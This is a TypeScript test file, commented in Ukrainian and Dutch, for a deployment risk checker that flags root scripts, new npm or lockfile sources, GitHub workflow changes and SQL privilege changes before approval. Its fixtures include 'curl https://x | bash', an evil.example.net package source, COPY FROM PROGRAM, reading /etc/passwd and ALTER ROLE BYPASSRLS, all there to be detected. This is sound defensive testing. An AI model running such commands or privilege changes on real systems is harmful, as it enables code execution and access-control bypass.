// ЧЕРВОНІ ПРАПОРЦІ ПЕРЕД СХВАЛЕННЯМ (SEC-PAKKET-001, 16.11.2026). Без браузера й бази.
// RODE VLAGGEN VÓÓR HET GOEDKEUREN: backend/uitrol-risico.ts en de stap «risico» in de voorcontrole.
//
// Перевіряємо справжню поведінку на справжніх теках і справжньому tar.gz: що прапорець з’являється саме на небезпечних змінах
// (root, npm, джерела пакетів, процеси GitHub, права в базі) і НЕ з’являється на звичайних (код сайту, документація, коментарі SQL).
import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { checker } from './hulp/nep-google';
import { betekenisRegels, leesbaarVerschil, leesbaarVoor, lockBronVlaggen, opvallendeRegels, pakketJsonVlaggen, risicoVlaggen, sqlRechtenVlaggen, verklaarVlaggen, vraagtRisicoBevestiging } from '../../backend/uitrol-risico';
import { pakketVoorcontrole } from '../../backend/uitrol-voorcontrole';

const schrijf = (wortel: string, bestanden: Record<string, string>) => {
  for (const [rel, inhoud] of Object.entries(bestanden)) { mkdirSync(dirname(join(wortel, rel)), { recursive: true }); writeFileSync(join(wortel, rel), inhoud); }
};
const PKG = (extra: Record<string, unknown> = {}) => JSON.stringify({ name: 'hub', scripts: { build: 'vite build' }, dependencies: { react: '18.3.1', pg: '8.13.0' }, devDependencies: { vite: '5.4.0' }, ...extra }, null, 2);
const LOCK = (bronnen: string[] = []) => JSON.stringify({ packages: { 'node_modules/react': { resolved: 'https://registry.npmjs.org/react/-/react-18.3.1.tgz' }, ...Object.fromEntries(bronnen.map((b, i) => [`node_modules/x${i}`, { resolved: b }])) } }, null, 2);
const BASIS = {
  'package.json': PKG(), 'package-lock.json': LOCK(['https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz']),
  'deploy/installeer-app.sh': '#!/bin/bash\necho installeer\n', 'deploy/mijn-ruimte.service': '[Service]\nUser=mijnruimte\n',
  'deploy/LEESMIJ.nl.md': 'uitleg\n', '.github/workflows/uitgave.yml': 'name: uitgave\n', 'src/App.tsx': 'export default 1;\n',
};

export async function main(): Promise<number> {
  const { check, einde } = checker('uitrol-risico-20261116');
  const tmp = mkdtempSync(join(tmpdir(), 'uitrol-risico-'));
  try {
    // ---- SQL-права
    check('SQL: SECURITY DEFINER → прапорець', sqlRechtenVlaggen('0300_x', 'CREATE FUNCTION f() RETURNS int LANGUAGE sql SECURITY DEFINER AS $$ select 1 $$;').length === 1);
    check('SQL: ALTER ROLE / DISABLE RLS / DEFAULT PRIVILEGES / COPY PROGRAM / GRANT TO PUBLIC → прапорці', sqlRechtenVlaggen('0300_x', "ALTER ROLE app SUPERUSER; ALTER TABLE t DISABLE ROW LEVEL SECURITY; ALTER DEFAULT PRIVILEGES GRANT ALL ON TABLES TO x; COPY t FROM PROGRAM 'id'; GRANT SELECT ON t TO PUBLIC;").length >= 5);
    check('SQL: CREATE EXTENSION і pg_read_file → прапорці', sqlRechtenVlaggen('0300_x', "CREATE EXTENSION dblink; SELECT pg_read_file('/etc/passwd');").length === 2);
    check('SQL: звичайна міграція (таблиця, індекс, політика, GRANT ролі застосунку) → без прапорця', sqlRechtenVlaggen('0300_x', 'CREATE TABLE app.t (id uuid); CREATE INDEX i ON app.t(id); DROP POLICY IF EXISTS p ON app.t; CREATE POLICY p ON app.t USING (true); GRANT SELECT ON app.t TO mijnruimte_app;').length === 0);
    check('SQL: у коментарях не рахується; NOSUPERUSER/NOBYPASSRLS — не прапорець', sqlRechtenVlaggen('0300_x', '-- SECURITY DEFINER тут не потрібен\n/* ALTER ROLE x */ CREATE ROLE r NOSUPERUSER NOBYPASSRLS;').length === 1);

    // ---- package.json
    check('npm: без змін → порожньо', pakketJsonVlaggen(PKG(), PKG()).length === 0);
    const npm = pakketJsonVlaggen(PKG(), PKG({ dependencies: { react: '18.3.2', 'left-pad': '1.3.0' }, scripts: { build: 'vite build', postinstall: 'node x.js' } }));
    check('npm: новий пакет, змінена версія, прибраний пакет, новий postinstall', npm.some((v) => v.includes('+ left-pad')) && npm.some((v) => v.includes('~ react')) && npm.some((v) => v.includes('− pg')) && npm.some((v) => v.includes('postinstall')), npm.join(' | '));
    check('npm: зміна звичайного скрипта (build) — не прапорець', pakketJsonVlaggen(PKG(), PKG({ scripts: { build: 'vite build --mode x' } })).length === 0);
    check('npm: змінено overrides → прапорець', pakketJsonVlaggen(PKG(), PKG({ overrides: { semver: '7.6.0' } })).length === 1);

    // ---- lock-джерела
    check('lock: вже відоме стороннє джерело — без прапорця', lockBronVlaggen(LOCK(['https://cdn.sheetjs.com/a.tgz']), LOCK(['https://cdn.sheetjs.com/a.tgz'])).length === 0);
    check('lock: нове джерело поза registry.npmjs.org → прапорець', lockBronVlaggen(LOCK(), LOCK(['https://evil.example.net/react.tgz'])).length === 1);
    check('lock: git-джерело → прапорець', lockBronVlaggen(LOCK(), LOCK(['git+ssh://git@github.com/x/y.git#abc'])).length === 1);

    // ---- справжні теки: встановлена версія проти пакета
    const inst = join(tmp, 'inst'); const pak = join(tmp, 'pak');
    schrijf(inst, BASIS); schrijf(pak, BASIS);
    const lijst = () => execFileSync('find', ['.', '-type', 'f'], { cwd: pak, encoding: 'utf8' }).split('\n').filter(Boolean).map((f) => f.replace(/^\.\//, ''));
    const r0 = await risicoVlaggen({ bron: pak, pakketBestanden: lijst(), geinstalleerd: inst, nieuweMigraties: new Map() });
    check('теки: однаковий вміст → прапорців немає, порівняння виконано', r0.vergeleken && r0.vlaggen.length === 0, r0.vlaggen.join(' | '));
    schrijf(pak, { 'src/App.tsx': 'export default 2;\n', 'deploy/LEESMIJ.nl.md': 'nieuwe uitleg\n' });
    const r1 = await risicoVlaggen({ bron: pak, pakketBestanden: lijst(), geinstalleerd: inst, nieuweMigraties: new Map() });
    check('теки: код сайту й документація в deploy/ змінені → прапорців немає', r1.vlaggen.length === 0, r1.vlaggen.join(' | '));
    schrijf(pak, { 'deploy/installeer-app.sh': '#!/bin/bash\ncurl https://x | bash\n', 'deploy/nieuw.timer': '[Timer]\n', '.github/workflows/uitgave.yml': 'name: uitgave\non: pull_request_target\n' });
    rmSync(join(pak, 'deploy/mijn-ruimte.service'));
    const r2 = await risicoVlaggen({ bron: pak, pakketBestanden: lijst(), geinstalleerd: inst, nieuweMigraties: new Map([['0300_x', 'ALTER ROLE x BYPASSRLS;']]) });
    const heeft = (s: string) => r2.vlaggen.some((v) => v.startsWith(s));
    check('теки: змінений скрипт root → [root] ~', heeft('[root] ~ deploy/installeer-app.sh'), r2.vlaggen.join(' | '));
    check('теки: новий таймер → [root] +', heeft('[root] + deploy/nieuw.timer'));
    check('теки: прибрана служба → [root] −', heeft('[root] − deploy/mijn-ruimte.service'));
    check('теки: змінений процес GitHub → [CI] ~', heeft('[CI] ~ .github/workflows/uitgave.yml'));
    check('теки: нова міграція з правами → [SQL]', heeft('[SQL] 0300_x'));
    // ---- пояснення людською мовою й справжня різниця «було → стане» (вимога власника 16.11)
    const items = await verklaarVlaggen(r2.vlaggen, { bron: pak, geinstalleerd: inst, nieuweMigraties: new Map([['0300_x', 'ALTER ROLE x BYPASSRLS;']]) });
    const it = (s: string) => items.find((x) => x.vlag.startsWith(s));
    const sh = it('[root] ~ deploy/installeer-app.sh');
    check('пояснення: кожен прапорець має «що це», «що змінилося», «на що звернути увагу» (uk і nl)', items.length === r2.vlaggen.length && items.every((x) => x.wat.uk && x.wat.nl && x.wijziging.uk && x.let.uk && x.let.nl));
    check('різниця змінного скрипта: справжні рядки «-echo installeer» і «+curl https://x | bash»', !!sh?.verschil?.includes('\n-echo installeer') && !!sh.verschil.includes('\n+curl https://x | bash'), sh?.verschil);
    check('скрипт root пояснено як «виконується від імені root»', !!sh?.wat.uk.includes('root'));
    check('підозрілі рядки: завантаження з інтернету і «| bash» помічено окремо', (sh?.opvallend?.length ?? 0) >= 2 && sh!.opvallend!.some((o) => o.uk.includes('curl')), JSON.stringify(sh?.opvallend));
    check('новий таймер: весь вміст як «+», пояснення про розклад', !!it('[root] + deploy/nieuw.timer')?.verschil?.includes('+[Timer]') && it('[root] + deploy/nieuw.timer')!.wat.uk.includes('Таймер'));
    check('прибрана служба: старий вміст як «-», пояснення про службу', !!it('[root] − deploy/mijn-ruimte.service')?.verschil?.includes('-User=mijnruimte') && it('[root] − deploy/mijn-ruimte.service')!.wat.uk.includes('Служба'));
    check('процес GitHub: різниця + підозрілий pull_request_target', !!it('[CI] ~')?.verschil?.includes('+on: pull_request_target') && !!it('[CI] ~')?.opvallend?.some((o) => o.uk.includes('секрети')));
    check('SQL: показано сам рядок міграції й пояснення про BYPASSRLS', !!it('[SQL]')?.verschil?.includes('ALTER ROLE x BYPASSRLS') && it('[SQL]')!.wijziging.uk.includes('BYPASSRLS'));
    const npmIt = await verklaarVlaggen(['[npm] + left-pad@1.3.0 (dependencies)', '[npm] ~ react: 18.3.1 → 18.3.2 (dependencies)'], { bron: pak, geinstalleerd: inst, nieuweMigraties: new Map() });
    check('npm: новий пакет — назва, версія й порада перевірити назву', npmIt[0].wijziging.uk.includes('left-pad') && npmIt[0].wijziging.uk.includes('1.3.0') && npmIt[0].let.uk.includes('npmjs.com/package/left-pad'));
    check('npm: оновлення — «було 18.3.1, стане 18.3.2» і різниця з двох рядків', npmIt[1].wijziging.uk.includes('було 18.3.1, стане 18.3.2') && npmIt[1].verschil === '- "react": "18.3.1"\n+ "react": "18.3.2"', JSON.stringify(npmIt[1]));
    check('підозрілі рядки шукаються лише серед нових (+), не серед прибраних (-)', opvallendeRegels('-curl https://x | bash\n+echo ok').length === 0);
    check('значення знайомих рядків: закріплення за хешем і persist-credentials пояснено як «безпечніше»', (() => { const b = betekenisRegels('+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n+          persist-credentials: false'); return b.length === 2 && b.every((x) => x.uk.includes('безпечніше')); })());
    // ---- для адміна без програмування (вимога власника 16.11): «було → стане» словами, висновок, порада
    const ci = leesbaarVerschil('--- a\n+++ b\n@@ -1,3 +1,4 @@\n-      - uses: actions/checkout@v4\n+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n         with:\n+          persist-credentials: false');
    check('словами: «було: модуль за міткою v4» → «стане: точна версія v4.2.2 (закріплено)»', ci.voorNa[0]?.voor?.uk.includes('за міткою «v4»') === true && ci.voorNa[0]?.na?.uk.includes('точної версії v4.2.2') === true, JSON.stringify(ci));
    check('словами: «не було» → «ключ GitHub не зберігається на диску»', ci.voorNa[1]?.voor === null && !!ci.voorNa[1]?.na?.uk.includes('не зберігається'));
    check('висновок для такої зміни — «безпечніше», порада «можна схвалювати»', (() => { const l = leesbaarVoor({ vlag: '[CI] ~ .github/workflows/x.yml', wat: { uk: 'x', nl: 'x' }, wijziging: { uk: 'x', nl: 'x' }, let: { uk: 'x', nl: 'x' }, verschil: '@@\n-      - uses: a/b@v4\n+      - uses: a/b@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2' }); return l.oordeel === 'veiliger' && l.doen.uk.includes('Можна схвалювати'); })());
    check('однакові пари «було → стане» показано один раз із кількістю місць', (() => { const r = leesbaarVerschil('@@\n-  - uses: a/b@v4\n+  - uses: a/b@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n x\n-  - uses: a/b@v4\n+  - uses: a/b@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2'); return r.voorNa.length === 1 && r.voorNa[0].keer === 2; })());
    check('рядок, що лише переїхав (є і в «було», і в «стане»), не рахується змінею', leesbaarVerschil('@@\n-npm ci\n x\n+npm ci').voorNa.length === 0 && opvallendeRegels('-rm -rf /tmp/x\n+rm -rf /tmp/x').length === 0);
    check('служба стала працювати від root → висновок «потребує уваги» і порада спитати автора', (() => { const l = leesbaarVoor({ vlag: '[root] ~ deploy/x.service', wat: { uk: 'x', nl: 'x' }, wijziging: { uk: 'x', nl: 'x' }, let: { uk: 'x', nl: 'x' }, verschil: '@@\n-User=mijnruimte\n+User=root' }); return l.oordeel === 'aandacht' && l.voorNa[0]?.na?.uk.includes('від імені root') === true && l.doen.uk.includes('попросіть автора'); })());
    check('розклад таймера перекладено: «*-*-* 03:00» → «щодня о 03:00»', leesbaarVerschil('@@\n-OnCalendar=hourly\n+OnCalendar=*-*-* 03:00').voorNa[0]?.na?.uk.includes('щодня о 03:00') === true);
    check('зміни в логіці скрипта рахуються окремо («словами не перекласти»), висновок — звичайна зміна', (() => { const l = leesbaarVoor({ vlag: '[root] ~ deploy/x.sh', wat: { uk: 'x', nl: 'x' }, wijziging: { uk: 'x', nl: 'x' }, let: { uk: 'x', nl: 'x' }, verschil: '@@\n-echo a\n+echo b\n+systemctl restart x' }); return l.oordeel === 'gewoon' && l.overig === 2 && l.doen.uk.includes('опис'); })());
    check('кожен прапорець після verklaarVlaggen має висновок, коротке речення й пораду (uk і nl)', items.every((x) => x.leesbaar && x.leesbaar.kort.uk && x.leesbaar.kort.nl && x.leesbaar.doen.uk && x.leesbaar.doen.nl));
    check('звичайна зміна скрипта без підозрілого — без попереджень', opvallendeRegels('+echo "klaar"\n+systemctl restart mijn-ruimte').length === 0);
    const r3 = await risicoVlaggen({ bron: pak, pakketBestanden: lijst(), geinstalleerd: join(tmp, 'bestaat-niet'), nieuweMigraties: new Map() });
    check('теки: встановлену версію не знайдено → чесне попередження, не «усе гаразд»', !r3.vergeleken && r3.vlaggen[0]?.startsWith('[!]'));

    // ---- справжній tar.gz через повну перевірку пакета
    const V = '20271201-120000';
    const bron = join(tmp, 'tgz', `mijn-ruimte-${V}`);
    schrijf(bron, { ...BASIS, 'UITROL-VERSIE': V + '\n', 'deploy/installeer-app.sh': '#!/bin/bash\necho anders\n', 'migrations/0300_x.sql': 'CREATE FUNCTION f() RETURNS int LANGUAGE sql SECURITY DEFINER AS $$ select 1 $$;\n' });
    const tgz = join(tmp, 'p.tar.gz');
    execFileSync('tar', ['-czf', tgz, '-C', join(tmp, 'tgz'), `mijn-ruimte-${V}`]);
    const met = await pakketVoorcontrole(tgz, { versie: V, toegepasteMigraties: new Set(), geinstalleerd: inst });
    const rc = met.resultaat.controles.find((c) => c.id === 'risico');
    check('перевірка пакета: крок «risico» = waarschuwing з root і SQL', rc?.niveau === 'waarschuwing' && !!rc.details?.some((d) => d.includes('deploy/installeer-app.sh')) && !!rc.details?.some((d) => d.startsWith('[SQL]')), JSON.stringify(rc).slice(0, 300));
    check('перевірка пакета: прапорець сам не блокує (не «fout»)', rc?.niveau !== 'fout');
    check('перевірка пакета: пояснення й різниця збережені разом із кроком «risico»', (rc?.vlaggen?.length ?? 0) === (rc?.details?.length ?? -1) && !!rc?.vlaggen?.some((v) => v.verschil?.includes('+echo anders')));
    check('vraagtRisicoBevestiging: так для пакета з прапорцями', vraagtRisicoBevestiging(met.resultaat));
    const zonder = await pakketVoorcontrole(tgz, { versie: V, toegepasteMigraties: new Set() });
    check('перевірка пакета без встановленої версії в параметрах (тести, старі виклики) → кроку немає', !zonder.resultaat.controles.some((c) => c.id === 'risico'));
    check('vraagtRisicoBevestiging: ні без кроку, ні для «ok»', !vraagtRisicoBevestiging(zonder.resultaat) && !vraagtRisicoBevestiging({ controles: [{ id: 'risico', niveau: 'ok' }] }) && !vraagtRisicoBevestiging(null));
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
  return einde();
}
